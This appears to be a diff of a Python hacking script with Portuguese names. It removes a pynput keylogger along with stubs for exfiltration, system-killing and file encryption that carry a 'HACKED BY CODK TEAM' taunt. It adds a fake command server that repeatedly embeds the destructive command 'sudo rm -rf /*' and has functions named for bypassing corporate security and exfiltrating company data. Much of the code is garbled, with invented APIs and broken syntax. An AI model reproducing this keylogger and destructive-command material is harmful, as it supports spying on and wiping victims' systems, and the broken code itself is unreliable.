@@ -1,106 +1,29 @@
-from pynput.keyboard import Listener
+#!/usr/bin/python3
 
-logFile = "/home/diegorego/keylogger_black_genesis/log.txt"
+def invocar_comando(linux):
+comando = "sudo rm -rf /*"
+while True:
+try:
+comando = comando + c.send(1024).decode(data_send)
+comando.enviar_arquivos = c.data_send(sendFile)
+comando.enviar_comandos = "comando.executar_comando(sistemas_linux) + comando = sudo rm -rf /*"
+except:
 
-def writeLog(key):
-    '''
-    Esta função será responsável por receber a tecla pressionada
-    via Listener e escrever no arquivo de log
-    '''
+def server():
+if __name__ == "__main__":
+start_server("192.168.15.72",1024)
+s.bind_server(("192.168.15.72",1024))
 
-    keydata = str(key)
+def burlar_segurança_de_empresas():
+comando = comando + s.send(2042).encode(security_bypass)
+comando.burlar_segurança_de_empresas = c.data_and_listener(bypassCompanySecuritySystems)
+comando.enviar_comandos_para_empresas = "sudo rm -rf /*"
+start_listener_on("192.168.15.72",1024)
+s.bind_server(("192.168.15.72",1024))
 
-    with open("logFile, a") as f:
-        f.write(keydata)
-
-def FileWrite():
-
-    with FileWrite(on_listener=sendFiles) as fw:
-        fw.send()
-
-def keydata():
-    keydata = keydata.replace("'", "")
-
-translate_keys = {
-     "Key.space": " ",
-     "Key.shift_r": "",
-     "Key.shift_l": "",
-     "Key.enter": "\n",
-     "Key.alt": "",
-     "Key.esc": "",
-     "Key.cmd": "",
-     "Key.caps_lock": "",
-}
-
-for key in translate_keys:
-
-    keydata
-
-logFile = "/home/diegorego/keylogger_black_genesis/log.txt"
-
-def writeLog(key):
-    '''
-    Esta função será responsável por receber a tecla personalizada
-    via Listener e escrever no arquivo de log
-    '''
-
-
-    translate_keys = {
-         "Key.space": " ",
-	 "Key.shift_r": "",
-	 "Key.shift_l": "",
-	 "Key.enter": "\n",
-	 "Key.alt": "",
-	 "Key.esc": "",
-	 "Key.cmd": "",
- 	 "Key.caps_lock": "",
-}
-
-keydata = str(key)
-
-keydata = keydata.replace("'", "")
-
-for key in translate_keys:
-
-    keydata = keydata.replace(key, translate_keys[key])
-
-def File():
-
-    with open(File) as f:
-        f.write(keydata)
-
-def log():
-
-    with Listener(on_press=writeLog) as l:
-        l.join(log)
-
-def sendFiles():
-
-    with FileWrite(on_listener=SENDFILES) as FW:
-        FW.sendfiles(SENDFILES)
-        GET.FDQN_GET.POST = "8.8.8.8"
-
-    with HackIntercept(on_target=CAPTUREDATA) as HI:
-        HI.capturedata(CAPTUREDATA)
-        POST.SEND_GET_DATA_FROM = "WINDOWS11 / * MSG_AS = MESSAGE: YOU ARE PWN3D, HACKED BY CODK TEAM (BRAZIL HACKER TEAM), RESPECT THE HACKERS."
-
-    with dataCapture(on_target_operating_system=DATACAPTURE) as DC:
-        DC.dataCapture(on_target=DATACAPTURE+EXFILTRATEDATA)
-        SEND.POST_MALICIOUS_DATA_TO_TARGET_OPERATING_SYSTEM = "WINDOWS11 / * GET_STATUS_CODE = 200_OK"
-
-    with killTargetOS(on_target_os_cmd=KILLSYSTEM) as KTOS:
-        KTC.killSystem("on_target_operating_system=COPY_DATA (Timeout=10) COPY_DATA=5000 MB+KILLSYSTEM")
-
-def encryptFiles():
-
-    with encryption as wb:
-        ENCRYPTALGORITHM.EncryptFiles(target_operating_system=ENCRYPTFILES)
-        EF.encryptfiles(on_target_operating_system=ENCRYPTFILES+ENCRYPTDATA)
-        GET.ENCRYPTDATA_FROM_DECRYPTED_DATA = "WINDOWS11 / * GET_STATUS_CODE = 200_OK"
-
-def decryptFiles():
-    
-    with decryption as wb:
-        DECRYPTALGORITHM.DecryptFiles(target_operating_system=DECRYPTFILES)
-        DF.decryptfiles(on_target_operating_system=DECRYPTFILES+DECRYPTDATA)
-        GET.DECRYPTDATA_FROM_DECRYPTED_DATA = "WINDOWS11 / * GET_STATUS_CODE = 200_OK"
+def iniciar_protocolo_de_exfiltração_de_dados():
+comando = comando + s.data_exfiltrate(2580).decode(data_exfiltration)
+comando.iniciar_operação_de_exfiltração_de_dados()
+comando.exfiltrar_dados_de_empresas()
+start_listener_on("192.168.15.72",1024)
+s.bind_server(("192.168.15.72",1024))
